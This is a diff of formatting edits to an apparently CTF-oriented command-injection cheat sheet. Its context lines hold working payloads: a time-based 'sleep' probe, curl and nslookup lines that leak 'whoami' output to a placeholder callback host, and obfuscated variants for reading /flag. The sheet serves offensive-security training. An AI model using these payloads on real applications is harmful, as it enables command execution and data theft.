@@ -33,7 +33,7 @@ related: [ssti-template-injection]
 ```
 # time-based: confirms execution
 target; sleep 5
-# out-of-band: exfiltrate via DNS/HTTP (needs a listener — see NET)
+# out-of-band: exfiltrate via DNS/HTTP (needs a listener, see NET)
 target; curl http://YOUR_HOST/$(whoami)
 target; nslookup $(whoami).YOUR_HOST
 ```
@@ -55,16 +55,16 @@ c''at /flag*   c\at /flag*   /bin/c?t /flag*   tac/rev/head/nl
 
 ## Gotchas
 
-- With no external callback available, **blind OOB gets expensive** — prefer confirming by time
+- With no external callback available, **blind OOB gets expensive**; prefer confirming by time
   (`sleep`) and then reading the flag directly into a field that reflects it (or redirect it to a
   served file). See the listener decision in the checklist.
-- `;` may be filtered while `|`/`&&`/`$()`/newline get through — test them all.
-- If the app uses `exec`/`system` with an array (no shell), metacharacters are **not** interpreted —
+- `;` may be filtered while `|`/`&&`/`$()`/newline get through; test them all.
+- If the app uses `exec`/`system` with an array (no shell), metacharacters are **not** interpreted;
   then it isn't classic command injection; reconsider (argument injection, SSTI, path traversal).
-- Distinguish from **SSTI** (`{{7*7}}`=49) and from **code injection** (language eval) — the fix and
+- Distinguish from **SSTI** (`{{7*7}}`=49) and from **code injection** (language eval); the fix and
   the payload differ.
 
 ## Cross-reference
 
-- `ssti-template-injection` — when the input is evaluated as a template, not as a shell command.
+- `ssti-template-injection`: when the input is evaluated as a template, not as a shell command.
 - Exfil via callback → NET category (`custom-tcp-service-scripting`).
